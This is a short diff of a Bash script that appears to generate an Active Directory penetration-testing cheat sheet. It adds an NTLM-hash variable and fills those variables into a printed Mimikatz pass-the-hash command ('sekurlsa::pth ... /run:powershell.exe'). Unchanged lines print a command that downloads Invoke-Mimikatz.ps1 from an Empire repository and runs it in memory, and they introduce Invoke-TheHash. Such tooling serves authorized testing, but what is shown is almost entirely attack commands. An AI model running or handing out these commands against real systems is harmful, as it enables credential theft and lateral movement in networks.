@@ -1,12 +1,4 @@
-# Test
 
-
-################################################################################
-# Variables                                                                    #
-################################################################################
-
-
-LocalIP="[Local-IP]";		
 LocalPort="[Local-Port]";		
 Username="'[Username]'";			
 NQUsername="[Username]";			
@@ -16,6 +8,7 @@ NQDomain="[Domain]";
 IP="'[IP]'";			
 NQIP="[IP]";	
 NTLMHash="'[NTLM-Hash]'";	
+NQNTLMHash="[NTLM-Hash]";	
 LDAP="";			
 DC="";				
 NS="<IP>";			
@@ -533,7 +526,7 @@ echo -e "${YELLOW}Load Mimikatz into memory${RESTORE}"
 echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz"
 echo -e ""
 echo -e "${YELLOW}Spawn PowerShell Process with supplied user's NTLM hash${RESTORE}"
-echo -e "Invoke-Mimikatz -Command '"\"sekurlsa::pth /user:[User] /domain:[Domain] /ntlm:[NTLM] /run:powershell.exe"\"'"
+echo -e "Invoke-Mimikatz -Command '"\"sekurlsa::pth /user:$NQUsername /domain:$NQDomain /ntlm:$NQNTLMHash /run:powershell.exe"\"'"
 echo -e ""
 echo -e ""
 echo -e "${IBLUE}Invoke-TheHash${RESTORE}"  
